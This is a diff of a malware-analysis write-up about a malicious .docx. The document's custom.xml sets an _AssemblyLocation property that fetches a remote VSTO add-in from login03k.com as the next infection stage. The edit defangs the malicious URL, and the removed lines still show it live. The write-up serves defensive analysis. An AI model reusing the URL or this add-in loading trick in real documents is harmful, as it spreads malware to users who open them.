@@ -98,7 +98,7 @@ By examining the contents of *custom.xml* we get the following:
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/custom-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">
 	<property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" name="_AssemblyLocation" pid="2">
-		<vt:lpwstr>https://login03k.com/update/Trusted Updater.vsto|a8ed4033-4074-4eb7-9c6a-93bbb8a3776c</vt:lpwstr>
+		<vt:lpwstr>hxxps://login03k[.]com/update/Trusted Updater.vsto|a8ed4033-4074-4eb7-9c6a-93bbb8a3776c</vt:lpwstr>
 	</property>
 	<property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" name="_AssemblyName" pid="3">
 		<vt:lpwstr>4E3C66D5-58D4-491E-A7D4-64AF99AF6E8B</vt:lpwstr>
@@ -108,9 +108,9 @@ By examining the contents of *custom.xml* we get the following:
 
 We see that *_AssemblyLocation* property contains the URL:  
 ```
-https://login03k.com/update/Trusted Updater.vsto
+hxxps://login03k[.]com/update/Trusted Updater.vsto
 ```
-which appears to contain the next stage of the infection. This also aligns with the fact that, based on the fetched extension, the .docx tries to fetch a VSTO file , which it then tries to execute (based on the existence of both *custom.xml* and *vstoDataStore* ).
+which appears to contain the next stage of the infection. This also aligns with the fact that, based on the fetched extension, the .docx tries to fetch a VSTO file , which it then tries to execute (based on the existence of both *custom.xml* and *vstoDataStore* ). Please note that both instances of the URL above were defanged.
 
 Unfortunately, this is our best guess for the next stage, since the aforementioned URL appears to be down.
 
